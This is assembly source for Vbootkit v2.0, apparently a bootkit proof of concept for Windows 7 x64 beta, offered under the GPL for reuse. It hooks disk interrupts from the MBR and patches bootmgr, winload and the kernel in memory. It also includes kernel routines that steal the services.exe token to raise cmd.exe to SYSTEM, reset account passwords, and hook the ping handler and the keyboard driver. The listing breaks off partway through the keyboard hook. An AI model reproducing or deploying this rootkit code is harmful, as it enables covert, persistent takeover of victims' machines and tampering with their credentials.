;Authors: Nitin Kumar ( nitin@nvlabs.in ) & Vipin Kumar (vipin@nvlabs.in)
;Please visit www.nvlabs.in for more information or updates
;NOTE:- We are not responsible for anything.Use at your own risk !!!!!!!!!!!!!!!!!!!!!
;If you develop anything using this code, please remember to give necessary credit to the authors

;This code was written in less than 3 days, so as such looks dirty but it works and proves the point.
;you can download the presentation and white paper  of Vbootkit v1 and V2 from nvlabs.in since we have cleared plenty of stuff there

;This code is available under GPL license.


;NOTE: This is Vbootkit v2.0 and only supports Windows 7 x64 editions ( tested only on build 7000 beta version)



; Total code size ( including work buffers )

%define CODE_SIZE 4096

%define PACKET_SIZE 1024   ; PING PACKET should be atleast 1024 bytes in size

  ;%define ENABLE_DISPLAY_REGS
 	cli
        xor bx,bx
        mov ss,bx
  	mov [ss:0x7bfe],sp
      	mov sp,0x7bfe               
        push ds
        pushad
        mov ds,bx
      	mov ax,[0x413]
        sub ax,2
        mov [0x413],ax
        shl ax,0x6
        mov ax,CODEBASEIN1MB
        mov es,ax
        
        cld
        mov si,0x7c00
        xor di,di
      	mov cx,(CODE_SIZE/2 )        ;number of bytes 2 copy to new location this is in words currently 4 kbs are loaded
        rep movsw
  	sti
      	mov ax,0x201
        mov cl,0x2
        cdq
        cli
    	mov eax,[0x4c]
  	mov [es:INT13INTERRUPTVALUE],eax
	mov word [0x4c], newint13handler
    	mov [0x4e],es
        sti
 directjumpwithouthook:
        push es
      	push word newmemorycodestart
        retf
newmemorycodestart:
        mov es,dx
        mov ax,0x201
        dec cx
        mov dl,0x80
        mov bh,0x7c
        int 0x13
        
        popad
        pop ds
        pop sp
  	jmp 0x0:0x7c00    ;jmp to original mbr from hard drive
  	
  db2: db 'BOOTMGR Signature Found',0
  
 newint13handler: 	    
        pushf
     
      			
  	cmp ah,0x42
        jz processint13request
        cmp ah,0x2
        jz processint13request
        popf
        jmp 0x0:0x0 ;jmp back to original handler;thse zero are filled above
INT13INTERRUPTVALUE EQU $-4
processint13request:
        mov [cs:STOREAH],ah
        popf
        pushf
  	call far [cs:INT13INTERRUPTVALUE] ;this jumps back to original int13 ivt
        jc returnback ;since request failed just go back
        pushf
        cli
        push es
        pusha
        mov ah,0x0       ;   this zero gets fillled by original ah code passed
STOREAH EQU $-1      
        cmp ah,0x42
        jnz notextrequest
        lodsw
        lodsw
        les bx,[si]
      
notextrequest:
        test al,al
        jng scandone
        cld
        mov cl,al
        mov al,0xd1
        shl cx,0x9
        mov di,bx
scanloop:
      
      
        
      
        repne scasb
        jnz scandone
        cmp dword [es:di],0x08e193a4;  0x74f685f0     ;these are signature bytes
        jnz scanloop
        cmp word [es:di+0x4],0x45ed 
        jnz scanloop
        
        ; okay compressed bootmgr has been found
        ; now patch bootmgr loader to display something
        pushad
        push ds
        push ax
  			mov ax,CODEBASEIN1MB	; Setup the Data Segment register
				mov ds,ax	
 				mov si, db2	; Load the string into position for the procedure.
 				call writemsg
 				pop ax
 				pop ds
 				popad
 				
 				
 				
 				;call DisplayALLREGS
 				; now time to patch bootmgr
 				;jmp $
        
        pushad
        push es
        push ds
        mov ax,0x2000;
        mov es,ax
        
        mov ax,CODEBASEIN1MB	; Setup the Data Segment register
				mov ds,ax	
				
				mov si,BOOTMGR_16_BIT_PATCH_STARTS
				
				mov di, 0xa8c    ; this is the offset of code which jumps to bootmgr_main
 				mov cx,BOOTMGR_16_BIT_PATCH_ENDS - BOOTMGR_16_BIT_PATCH_STARTS 
 				rep movsb
 				pop ds
 				pop es
 				popad
        
scandone:            ;pop pushed registers and get out
        popa
        pop es
        popf
returnback:  
     	retf 0x2




booter_str:   db 'Vbootkit2 : ', 0
booter_init:  db '16 bit stuff done', 0
    
; below are 16 bit procedures/functions

;This writes a string  with  prepended message, message and then a new line
writemsg:
   	push ax
		push si
		mov si,booter_str
		call writestr
		pop si
		call writestr
		
		call crlf
		pop ax
		ret

;
; Write a character to the screen.

writechr:
		pushfd
		pushad
		mov ah,0Eh
		xor bx,bx
		int 10h
		popad
		popfd
		ret
       
  
; crlf: Print a newline
;
crlf:
    pushfd
   	push ax
		mov al,0xd   ; CR
		call writechr
	  mov al,0xa   ;LF
		call writechr
		pop ax
		popfd
		ret

;
; writestr: write a null-terminated string to the console, saving  registers on entry.

;
writestr:
		pushfd
    pushad
.top:	
   	lodsb
   	test al,al
     jz .end
		call writechr
	   jmp short .top
.end:
		popad
		popfd
    ret


%ifdef ENABLE_DISPLAY_REGS
; this function will display  EAX on the screen
DisplayEAX :;
			pushad
			xor ECX, ECX ; 
			mov ebx, 10 ; 
.loop1:
			xor EDX,EDX 
			div EBX ; divide ax by bx and put the remainder in dx! this does basically this: 420/10 with 402 = 321 + 99.
			push edx ; save the remainder in the stack
			INC ECX ; count the number of remainders we saved in the stack.
			cmp eax, 0 ; are we done yet with division? we'll divide ax by bx until ax = 0
			jnz .loop1 ; loop until eax = 0

.loop2: ; 
			pop EAX ; huh! we get the last value of dx we put in the stack which is last remainder of the devision.
			add EAX, 48 ;
			call writechr ; 
			dec ecx ; 
			jnz .loop2 ;
			popad
ret ; 


; this function will display  EAX on the screen in hex
DisplayEAXHEX :;
			pushad
			xor ECX, ECX ; 
			mov ebx, 16 ; 
.loop1:
			xor EDX,EDX 
			div EBX ; divide ax by bx and put the remainder in dx! this does basically this: 420/10 with 402 = 321 + 99.
			push edx ; save the remainder in the stack
			INC ECX ; count the number of remainders we saved in the stack.
			cmp eax, 0 ; are we done yet with division? we'll divide ax by bx until ax = 0
			jnz .loop1 ; loop until eax = 0

.loop2: ; 
			pop EAX ; huh! we get the last value of dx we put in the stack which is last remainder of the devision.
			cmp eax,9
			jle .num
			
			add eax,7
			

.num	:		
			add EAX, 48 ;
			call writechr ; 
			dec ecx ; 
			jnz .loop2 ;
			popad
ret ; 

DisplayALLREGS:

       pushad
      
   		 push CODEBASEIN1MB	; Setup the Data Segment register
			 pop ds	
 			
 			push ESI
 			
 			mov si, m_EAX       ; display EAX
			call writestr
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr
			
			
			mov si, m_EBX       ; display EBX
			call writestr
			MOV EAX,EBX
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
			
			mov si, m_ECX       ; display ECX
			call writestr
			MOV EAX,ECX
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
			
			mov si, m_EDX       ; display EDX
			call writestr
			MOV EAX,EDX
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr
			
  
  call crlf    
      			mov si, m_EBP       ; display EBP
			call writestr
			MOV EAX,EBP
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
			
			mov si, m_ESI       ; display ESI
			call writestr
			pop ESI
			MOV EAX,ESI
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr
			
			
						mov si, m_EDI       ; display EDI
			call writestr
			MOV EAX,EDI
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
			
    
      call crlf 
      
      
      mov si, m_ES       ; display ES
			call writestr
			MOV EAX,0
			MOV AX,ES
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
      
      
       mov si, m_DS       ; display DS
			call writestr
			MOV EAX,0
			MOV AX,DS
			call DisplayEAXHEX
			mov al, ' ' 
			call writechr			
      
       popad
       
       ret


m_EAX: db 'EAX ',0
m_EBX: db 'EBX ',0
m_ECX: db 'ECX ',0
m_EDX: db 'EDX ',0
m_ESP: db 'ESP ',0
m_EBP: db 'EBP ',0
m_ESI: db 'ESI ',0
m_EDI: db 'EDI ',0
m_ES:  db 'ES ',0
m_DS:  db 'DS ',0   
%endif


times 510-($-$$) db 0	; Fill the rest with zeros

DW 0xAA55           ; add HDD signature

; this is the patch for 16 bit code which wil jump into our code

BOOTMGR_16_BIT_PATCH_STARTS:
;push  CODEBASEIN1MBEXACT + BOOTMGR_PATCHER_STARTS - 0x20000
;ret


	db 0x66, 0xbb
	dd	CODEBASEIN1MBEXACT + BOOTMGR_PATCHER_STARTS
	db 0x90
	;		mov ax,CODEBASEIN1MB
	;			mov ebx, CODEBASEIN1MBEXACT + BOOTMGR_PATCHER_STARTS
	;			db 90
BOOTMGR_16_BIT_PATCH_ENDS:




USE32




;########################################################
;##  32 bit Code,is called before execution of BOOTMGR  ##
;########################################################
		
CODE32START:   

BOOTMGR_PATCHER_STARTS:

		
;mov dword [cs:0xa93],0
;jmp $
push edx
push ebp
xor ebp,ebp

; this is the patchin which will give us control just before execution of winload.exe /winresume.exe starts
mov DWORD [0x412002], 0x91198118

EXE_LOADER_PATCH_ADDRESS EQU 0x44fbc4         ; this is where patch will be applied

mov byte [EXE_LOADER_PATCH_ADDRESS],0x68    ; push dword opcode
mov dword [EXE_LOADER_PATCH_ADDRESS + 1],  CODEBASEIN1MBEXACT + WINLOAD_PATCHER_STARTS
mov byte [EXE_LOADER_PATCH_ADDRESS+5],0xc3    ; ret opcode

mov ebx, 0x401000

push ebx
ret


BOOTMGR_PATCHER_ENDS:
;extra baggage required to get the job done                


WINLOAD_PATCHER_STARTS:

  push   ebp
  push   esi
  push   edi
  push   ebx
  push   es
  push   ds
  mov    eax,cr0
                             ; do the winload patching here !!!!!!!!!!!!!!!!!!!!!!!!!

;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!                             
push eax 

mov eax,cr3
mov [0x9e000],eax
mov dword [0x9e004],0x12121212  ; who is asking for signature

;disable paging and write protection
mov eax, cr0
and eax, 0x7FFEFFFF          
mov cr0, eax


push ESI
PUSH EDI

MOV ESI, 0x200000
searchagain:

cmp dword [ESI], 0x4cf63348  ;  48 33 F6 4C
jne movetonextbyte
cmp dword [ESI+4],0x8b4ce18b ;   8B E1 4C 8B
jne movetonextbyte

cmp dword [ESI+8],0xc02b48ea;  EA 48 2B C0
jnz movetonextbyte

;sub esi, 0x63A20
jmp patchaddfound


movetonextbyte:
inc ESI
cmp ESI, 0x400000
je infiloop
jmp searchagain

infiloop: jmp $
WINLOAD_NTOS_PATCH_ADDRESS EQU 0x330a20   ;;  BP at 0x2EE9B2 and skip the debugger to get to point


; the code we are writing is 
;  mov r12,CODEBASEIN1MBEXACT + NTKERNEL_PATCHER_STARTS
;  jmp r12
;
patchaddfound:

;patch address found it's in ESI
mov word [ESI], 0xbc49
mov dword [ESI+2], CODEBASEIN1MBEXACT + NTKERNEL_PATCHER_STARTS
mov dword [ESI+6], 0     ; fill remaining bytes with 0
mov word [ESI+10], 0xff41
mov byte [ESI+12], 0xe4 

ADD esi, 0xf  ; our code is 0xe or 14 bytes long
mov dword [ CODEBASEIN1MBEXACT + WINLOAD_RETURN_ADDRESS], esi

; enable paging and write protection once again
; no need to enable paging
;mov eax, cr0
;or eax, 0x80010000
;mov cr0, eax

pop eax
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
push 0x44fbcd   ; this is where we jump back
ret
WINLOAD_PATCHER_ENDS:

; after this evrything is in 64 bits mode
bits 64
use64

NTKERNEL_PATCHER_STARTS:


mov r12,rdi
push rdx

mov rdi,rdx

;This is the entrypoint , currently it's hard coded, bit resolve it and put code to find it out
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
sub rdi, 0x2C0950  ; now RSI , contains base of kernel'

mov rdx,rdi
; store kernel base for future


mov [CODEBASEIN1MBEXACT+KERNEL_BASE],rdx

push rcx
DATA_AREA_OFFSET EQU 0x266000   ; data segment segment
CODE_AREA_OFFSET EQU 0x572380
;; make backup of kernel code we are going to patch
mov rsi,rdi
add rsi, CODE_AREA_OFFSET
add rdi,DATA_AREA_OFFSET  ; get to data RW location and  kernel code to memory
mov rcx, codeends
rep movsb

; now backup ourselves  to the data area after the backup code
mov rsi,CODEBASEIN1MBEXACT
mov rcx, codeends
rep movsb

;copy our patch to start RtlpCreateUserProcess
mov rsi,CODEBASEIN1MBEXACT + MINKERNEL_STARTPROCESS_PATCH_STARTS
mov rdi,rdx
add rdi,CODE_AREA_OFFSET  ; get to code RW location and write signature together with our own copy
mov rcx, MINKERNEL_STARTPROCESS_PATCH_ENDS -MINKERNEL_STARTPROCESS_PATCH_STARTS
rep movsb

pop rcx

pop rdx

mov rdi,r12
xor rsi,rsi
mov r12,rcx,
mov r13,rdx           ; here rdx contains kennel entrypoint where we will jump
sub rax,rax
db 0x66, 0x8e, 0xd0

db 0x68
WINLOAD_RETURN_ADDRESS: dd 0 ;            this will be filed at runtime
ret

NTKERNEL_PATCHER_ENDS:


; first thing we will do is allocate some memory
; them we will copy our code to new memory
; give it RWX permissions, then jump onto new copy
; OHH, kernel pages always have RWX permissions except stack Which is marked as NX, this is sort of optimisation for speed

MINKERNEL_STARTPROCESS_PATCH_STARTS:


; fix this bock of code
mov Qword RAX,0
KERNEL_BASE EQU $-8

;!!!!!!!! BUG BUG BUG in nasm , it just doesn't taks 3 additions  which are resolved at assembling time
;ADD  RAX, (DATA_AREA_OFFSET + codeends + SREGS)

ADD RAX,SREGS + DATA_AREA_OFFSET ;
ADD RAX, codeends


mov [RAX],RAX
MOV [RAX+8],RBX
MOV [RAX+16],RCX
MOV [RAX+24],RDX
MOV [RAX+32],RSI
MOV [RAX+40],RDI
MOV [RAX+48],RBP

;!!!!!!!! BUG BUG BUG in nasm , it just doesn't taks 3 additions  which are resolved at assembling time
;SUB RAX, DATA_AREA_OFFSET + FINAL_BYTE + SREGS   ; get the kenel base back 

SUB RAX,SREGS + DATA_AREA_OFFSET ;
SUB RAX, codeends

MOV RBP,RAX

mov ebx , 0x0311B83F  ; ExAllocatePool
call CallExportedFunctionbyHash64

mov edx,0x40000   ; No. of bytes
mov ecx, 0         ; pool type non paged pool
call rax ;; call Exallocate pool

; now copy ourselves to this newly allocated block


mov rsi, rbp
add rsi, DATA_AREA_OFFSET +  codeends
mov rdi, rax
mov rcx, codeends 
rep movsb

mov rdi,rax
add rdi, EntryPointKernelExecution
jmp rdi

CallExportedFunctionbyHash64:
    push rdx
    push rcx
    push rdi
    push rbx
    

    push rsi
    push rbp    	
		xor rcx,rcx                   ;ecx stores function number
		
		xor rdi,rdi
		mov dword edi,[rbp+0x3c] ; to get offset to pe header
		mov dword edi,[rbp+rdi+0x88] ; to get offset to export table   ; this value is 0x78 for 32 bit executables

		add rdi,rbp
callnextexporttableentry:
    XOR RDX,RDX
		mov dword edx,[rdi+0x20]
		add rdx,rbp
		xor rsi,rsi
		mov esi,[rdx+rcx*4]
		add rsi,rbp
		xor eax,eax
		cdq

		
callnextbyte:
		lodsb
		ror edx,0xd
		add edx,eax
		test al,al
		jnz callnextbyte
		inc ecx       
		
		cmp edx,ebx
        	jnz  callnextexporttableentry
		dec ecx             ; hash number found
	
	  XOR RBX,RBX
		mov ebx,[rdi+0x24]
 		add rbx,rbp
 		mov cx,[rbx+rcx*2]
 		XOR RBX,RBX
		mov ebx,[rdi+0x1c]
		add rbx,rbp
		xor rax,rax
		mov eax,[rbx+rcx*4]
		add rax,rbp    ;//function address arrives in eax now
		
    pop rbp
    pop rsi
    pop rbx
    pop rdi
    pop rcx
    pop rdx
    ret  ;just call the function after finding it , address is returned in rax


KERNEL_CODE:  dq 0
VBOOTKIT_CODE: dq 0

SREGS: dq 0
sRBXs: dq 0
sRCXs: dq 0
sRDXs: dq 0
sRSIs: dq 0
sRDIs: dq 0
sRBPs: dq 0

MINKERNEL_STARTPROCESS_PATCH_ENDS:



; This code is excuted in the newly allocated block

EntryPointKernelExecution:


mov rsi,NEW_CODEBASE
add rsi,rax

mov [RSI],EAX

; first things first
;fix the kernel

mov rsi, rbp
add rsi, DATA_AREA_OFFSET 
mov rdi, rbp
add rdi, CODE_AREA_OFFSET
mov rcx, codeends 
rep movsb

mov rdi,rax


mov [rdi+ KERNEL_BASE2],rbp
mov [rdi+ THREADCODE_BASE],rdi


lea rcx,[rdi+Shellcode_Thread] ;new thread start address in RCX
 
call  CreateSystemThread



push RBP
mov rax,rdi
; restore back all the registers
ADD RAX,  SREGS
;mov [RAX],RAX
MOV RBX,[RAX+8]
MOV RCX,[RAX+16]
MOV RDX,[RAX+24]
MOV RSI,[RAX+32]
MOV RDI,[RAX+40]
MOV RBP,[RAX+48]

pop rax
add rax, CODE_AREA_OFFSET


jmp rax  ;return back to kernel


; This function creates  a thread in the kernel, Thread Etrypoint is in RCX
CreateSystemThread:
push rbx
mov ebx , 0x5814A503  ; PsCreateSystemThread
call CallExportedFunctionbyHash64

mov rsi,rax
push r9
push r8
push rcx
push rdx

sub     rsp, 68h
mov    qword [rsp+68h-0x18], 0


 mov     [rsp+68h-0x40], rcx
mov    qword [rsp+68h-0x48], 0
xor     r9d, r9d        ; ProcessHandle
xor     r8d, r8d        ; ObjectAttributes
mov     edx, 1FFFFFh    ; DesiredAccess
lea     rcx, [rsp+ 0x68 -0x18] ; ThreadHandle

; to avoid  some errorr change protection of memory to rwx
call rsi  ; for testing create thread call blocked



add   rsp, 68h
pop rdx
pop rcx
pop r8
pop r9

pop rbx
ret

;Thread which keeps on running 
Shellcode_Thread:

mov eax, edx
mov edx,eax

.again :

call GET_KERNEL_BASE_AND_CODE_BASE

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; This code is called only one time
; what ever on time jobs you have complete them here

; start the command Processor
lea rcx,[rdi+DELAYED_COMMAND_PROCESSOR] ;new thread start address in RCX
call  CreateSystemThread


;call DELAY_EXECUTION_BY_5_SEC       ; fall into 5 sec delay
sub     rsp, 88h
mov     qword [rsp+88h-58h], 0xFFFFFFFFFD050F80     ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs

mov ebx,0xDDE6DA64  ; KeInitializeTimer
call CallExportedFunctionbyHash64         ;obtain function address

lea     rcx, [rsp+88h-48h] ; Timer
call    rax

mov ebx,0xF269DE1D  ; KeSetTimer
call CallExportedFunctionbyHash64         ;obtain function address

xor     r8d, r8d        ; Dpc
mov     rdx, qword  [rsp+88h-58h] ; DueTime
lea     rcx, [rsp+88h-48h] ; Timer
call    rax


mov ebx,0x1D93F035  ; KeWaitForSingleObject
call CallExportedFunctionbyHash64         ;obtain function address

mov     qword [rsp+88h-0x68], 0
mov     r9b, 1          ; Alertable
xor     r8d, r8d        ; WaitMode
xor     edx, edx        ; WaitReason
lea     rcx, [rsp+88h-48h] ; Object

call rax
add     rsp, 88h





; sleep 1 more time              ohhh GOD, where are macros/subroutines 
; Click this, this was just done in 2-3 days, so code is as it as


sub     rsp, 88h
mov     qword [rsp+88h-58h], 0xFFFFFFFFFD050F80     ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs

mov ebx,0xDDE6DA64  ; KeInitializeTimer
call CallExportedFunctionbyHash64         ;obtain function address

lea     rcx, [rsp+88h-48h] ; Timer
call    rax

mov ebx,0xF269DE1D  ; KeSetTimer
call CallExportedFunctionbyHash64         ;obtain function address

xor     r8d, r8d        ; Dpc
mov     rdx, qword  [rsp+88h-58h] ; DueTime
lea     rcx, [rsp+88h-48h] ; Timer
call    rax


mov ebx,0x1D93F035  ; KeWaitForSingleObject
call CallExportedFunctionbyHash64         ;obtain function address

mov     qword [rsp+88h-0x68], 0
mov     r9b, 1          ; Alertable
xor     r8d, r8d        ; WaitMode
xor     edx, edx        ; WaitReason
lea     rcx, [rsp+88h-48h] ; Object

call rax
add     rsp, 88h


; sleep 1 more time  , oops we are still missing the function call


sub     rsp, 88h
mov     qword [rsp+88h-58h], 0xFFFFFFFFFD050F80     ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs

mov ebx,0xDDE6DA64  ; KeInitializeTimer
call CallExportedFunctionbyHash64         ;obtain function address

lea     rcx, [rsp+88h-48h] ; Timer
call    rax

mov ebx,0xF269DE1D  ; KeSetTimer
call CallExportedFunctionbyHash64         ;obtain function address

xor     r8d, r8d        ; Dpc
mov     rdx, qword  [rsp+88h-58h] ; DueTime
lea     rcx, [rsp+88h-48h] ; Timer
call    rax


mov ebx,0x1D93F035  ; KeWaitForSingleObject
call CallExportedFunctionbyHash64         ;obtain function address

mov     qword [rsp+88h-0x68], 0
mov     r9b, 1          ; Alertable
xor     r8d, r8d        ; WaitMode
xor     edx, edx        ; WaitReason
lea     rcx, [rsp+88h-48h] ; Object

call rax
add     rsp, 88h

; before hooking lets init the buffer

mov byte [rdi+KEY_COUNT],0  ; the buffer will be init automatically

call HOOK_KEYBOARD

call HOOK_PING_ECHO_PACKETS




;Below this line everything is in loop so might be called again & again
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
One_Time_JOB_Completed:
; ; fall into 5 sec delay

sub     rsp, 88h
mov     qword [rsp+88h-58h], 0xFFFFFFFFFD050F80     ;it value is -5 *10 * 1000 * 1000 for waiting 5 secs

mov ebx,0xDDE6DA64  ; KeInitializeTimer
call CallExportedFunctionbyHash64         ;obtain function address

lea     rcx, [rsp+88h-48h] ; Timer
call    rax

mov ebx,0xF269DE1D  ; KeSetTimer
call CallExportedFunctionbyHash64         ;obtain function address

xor     r8d, r8d        ; Dpc
mov     rdx, qword  [rsp+88h-58h] ; DueTime
lea     rcx, [rsp+88h-48h] ; Timer
call    rax


mov ebx,0x1D93F035  ; KeWaitForSingleObject
call CallExportedFunctionbyHash64         ;obtain function address

mov     qword [rsp+88h-0x68], 0
mov     r9b, 1          ; Alertable
xor     r8d, r8d        ; WaitMode
xor     edx, edx        ; WaitReason
lea     rcx, [rsp+88h-48h] ; Object

call rax
add     rsp, 88h

; put repetetive jobs here


;;;

;here are all repetetive jobs with 5 second timer

; Reset Password for this RID


cmp byte [RDI+RESET_PASSWORD],0 ; don't process password if this vaue is 0
je Passwords_Done

mov r15,3000

TRY_NEXT_RID:

call GET_KERNEL_BASE_AND_CODE_BASE 
mov rcx, r15
call ResetPassword

cmp r15,0x100
je Passwords_Done_Make_Control_Register_0  ; ge ready for next time

sub r15,1
jmp 	TRY_NEXT_RID

Passwords_Done_Make_Control_Register_0:

mov byte [RDI+RESET_PASSWORD],0  ; make this value 0, s as it doesn't reset it everytime

cmp byte [RDI+PASSWORD_STATE],1   ; passwords have been reset, give user a chance to log in
jne change_password_state


mov byte [RDI+PASSWORD_STATE],0 ; Mark password restore done
jmp Passwords_Done

change_password_state:
mov  byte [RDI+PASSWORD_STATE],1  ; mark dopassword restore next time

Passwords_Done:

;; repetetiv code can be placed here

jmp 	One_Time_JOB_Completed


DELAY_EXECUTION_BY_5_SEC:


ret

; this  function gets the kernel base in rbp and CODE_BASE in RDI
GET_KERNEL_BASE_AND_CODE_BASE:
mov rbp,0
KERNEL_BASE2 EQU $-8

mov rdi,0
THREADCODE_BASE EQU $-8
ret



;------------------------------------------------------------------------------------------------------------

Escalate_CMD:
;privilege escalation code

  mov ebx,0xdaf46e78     ;Call IoGetCurrentProcess
	call CallExportedFunctionbyHash64         ;obtain function address
	call rax   ;returns system eprocess in rax
	

; This code was rapidly converted from 32 bit version to 64 bit version
;Howevr one catch is we never increment the REF count of token, which lead to BSOD, when we close the CMD
; but hey this is POC, and is just supposed to work for demo reasons
; the token is EX_FAST_REF structure and very easy to increase REF count , but come on

  ; OS and SP dependent data ;;;;;
ACTIVE_PROCESS_LINKS_OFFSET EQU 0x188
SECURITY_TOKEN_OFFSET EQU 0x208	
IMAGE_NAME_OFFSET EQU  0x2e0

	
;now _EPROCESS for kernel or System is in eax

xor rcx,rcx
mov cx, 0x188            ;for Windows 7 Beta active process link offset  !!!!!       OS and SP dependent data
add  rax, rcx ; get address of EPROCESS+ActiveProcessLinks
mov  rdx,rax   ; store first pointer, so we can compare and know when we have looped over all the processs

Service_Finding_Loop:
mov rax, [rax] ; get next EPROCESS struct
mov cx,  IMAGE_NAME_OFFSET- ACTIVE_PROCESS_LINKS_OFFSET
                  
cmp dword [rax+rcx], 0x56524553; 0x53455256  ;"SERV"            ; is it SERVICES.EXE? xp and 2k3 knows upper case
je ServicesFound
cmp dword [rax+rcx], 0x76726573 ; 0x73657276 ;"serv"            ; is it SERVICES.EXE? win2k knows lower case
je ServicesFound

cmp rax,rdx
je ServicesNotFound

jmp Service_Finding_Loop

ServicesFound:

; we are here means we have found the service.exe   get he security token

; now  we store services.exe security token, so as we use it later on
mov cx,  SECURITY_TOKEN_OFFSET - ACTIVE_PROCESS_LINKS_OFFSET    ;SecurityTokenoffset for Windows 7 RC1   !!!! OS and SP dependent data
mov rbx,[rax + rcx ]       ;    to obtain token from _EPROCESS

	            ;+0x2d8 ImageFileName    : [16] UChar




; not start finding cmd,exe whom we will escalate

;now we start again from beginning to find all cmd.exe and then try to escalate them to SYSTEM priv


; rdx contains  first entry of list

mov rax, rdx
CMD_Finding_Loop:
mov rax, [rax] ; get next EPROCESS struct
mov cx,  IMAGE_NAME_OFFSET- ACTIVE_PROCESS_LINKS_OFFSET
                  
cmp dword [rax+rcx],0x2e444d43 ;"CMD."            ; is it CMD.EXE? winxp knows upper case
je CMDFound
cmp dword [rax+rcx], 0x2e646d63 ;"cmd."            ; is it cmd.exe?  win2k knows lower case
je CMDFound

cmp rax,rdx
je CMDNotFound

jmp CMD_Finding_Loop


CMDFound:
; do the token patching and jump back into loop , so as wwe can find other cmd.exe( just in case 2 cmd.exe are running

xor rcx,rcx


; please remember rbx contains services.exe token

mov cx,  SECURITY_TOKEN_OFFSET - ACTIVE_PROCESS_LINKS_OFFSET    ;SecurityTokenoffset for Windows 7 RC1   !!!! OS and SP dependent data
mov [rax + rcx ] , rbx      ;    update the token and also lose one token refence

; keep on searching another cmd.exe
jmp  CMD_Finding_Loop

; if services.exe is not found, just  come ver here, wait for 5 seconds and then try again

ServicesNotFound:
CMDNotFound:


ret ;  return to  caller



;----------------------------

; this functions  finds the base address of tcpip.sys in memory, so as we can patch it later on
HOOK_PING_ECHO_PACKETS:

sub     rsp, 58h

mov  dword   [rsp+58h-0x14], 0x88000
xor      rdx,rdx

mov ebx , 0x0311B83F  ; ExAllocatePool
call CallExportedFunctionbyHash64


mov     edx,  [rsp+58h-0x14]   ; NumberOfBytes
mov ecx, 0         ; pool type non paged pool
call rax ;; call Exallocate pool

mov     [rsp+58h-0x38], rax


mov ebx , 0x5717330E  ; ZwQuerySystemInformation
call CallExportedFunctionbyHash64

lea     r9, [rsp+58h-0x14]
mov  dword   r8d, [rsp+58h-0x14]
mov     rdx, [rsp+58h-0x38]
mov     ecx, 0Bh
call    rax ; ZwQuerySystemInformation

; call was success  so get the pointers back
mov     rax, [rsp+58h-0x38]
mov     ebx, [rax]        ; now ebx contains, total no. of modules loaded in the kernel
add     rax, 4  ; now rax points to first  entry module list
xor edx,edx

find_tcpip_loop:
                ;
mov r8,[rax + 20]   ; the base is in r8 , the module base is
mov r9,[rax + 44 + 29]   ; name starts at offset    44
                         ; Howver name has following stuff prepended to the name
                         ; \SystemRoot\System32\drivers\
                          
                         ; s skip this many bytes from the name to each the driver name start

; now compare the name, whether name is tcpip.sys   , however we leave the last s in comparision

mov r10, 0x79732e7069706374  ; ys.pipct       tcpip.sy     in quad hex     79732e7069706374    
cmp r9, r10                  ; 
je TCPIP_Found                    

inc edx

add rax, 296  ; one entry is 296 bytes long

cmp ebx, edx
jne  find_tcpip_loop

jmp return_from_TCPIP_without_patching

TCPIP_Found:

; the base is in r8


; now fix get ready to get control
Ipv4pHandleEchoRequest EQU  0x132E30;

mov r10,r8
add r10, Ipv4pHandleEchoRequest  + 0x10    ; we expect our patch to less than 10 bytes, it's actually 0xc bytes
mov [rdi+TCP_RETURN_LOCATION],r10

lea r10,[rdi+PROCESS_PING_PACKET]
mov [rdi+GENERIC_PATCH_JMP_LOCATION],r10

;now write the patch
; lets disable write protection

cli
mov rax, cr0
and eax,0FFFEFFFFh
mov cr0, rax

push rdi
lea rsi,[rdi+PATCH_GENERIC]
lea rdi,[r8+Ipv4pHandleEchoRequest]
mov rcx,PATCH_GENERIC_OVER-PATCH_GENERIC
rep movsb

pop rdi
; now get the protection back

or eax, 10000h
mov cr0, rax
sti

return_from_TCPIP_without_patching:

add     rsp, 58h
ret
		



; this functions  finds the base address of tcpip.sys in memory, s as we can patch it later on
HOOK_KEYBOARD:

sub     rsp, 58h

mov  dword   [rsp+58h-0x14], 0x88000
xor      rdx,rdx

mov ebx , 0x0311B83F  ; ExAllocatePool
call CallExportedFunctionbyHash64


mov     edx,  [rsp+58h-0x14]   ; NumberOfBytes
mov ecx, 0         ; pool type non paged pool
call rax ;; call Exallocate pool

mov     [rsp+58h-0x38], rax


mov ebx , 0x5717330E  ; ZwQuerySystemInformation
call CallExportedFunctionbyHash64

lea     r9, [rsp+58h-0x14]
mov  dword   r8d, [rsp+58h-0x14]
mov     rdx, [rsp+58h-0x38]
mov     ecx, 0Bh
call    rax ; ZwQuerySystemInformation

; call was success  so get the pointers back
mov     rax, [rsp+58h-0x38]
mov     ebx, [rax]        ; now ebx contains, total no. of modules loaded in the kernel
add     rax, 4  ; now rax points to first  entry module list
xor edx,edx

xor rcx,rcx

find_i8042prt_loop:
                ;
mov r8,[rax + 20]   ; the base is in r8 , the module base is
mov r9,[rax + RCX+ 44 ]   ; name starts at offset    44
                         ; Howver name he following stuff prepended to the name
                         ; \SystemRoot\System32\drivers\
                          
                         ; s skip this many bytes from the name to each the driver name start

; now compare the name, whether name is tcpip.sys   , however we leave the last s in comparision

mov r10, 0x7472703234303869  ; trp2408i      i8042prt     in quad hex      0x747270323430386
cmp r9, r10                  ; 
je I8042prt_Found 

inc rcx
cmp rcx,128                   
jne find_i8042prt_loop

inc edx

add rax, 296  ; one entry is 29 bytes long
xor rcx,rcx
cmp ebx, edx
jne  find_i8042prt_loop

jmp return_from_KEYBOARD_HOOK_without_patching

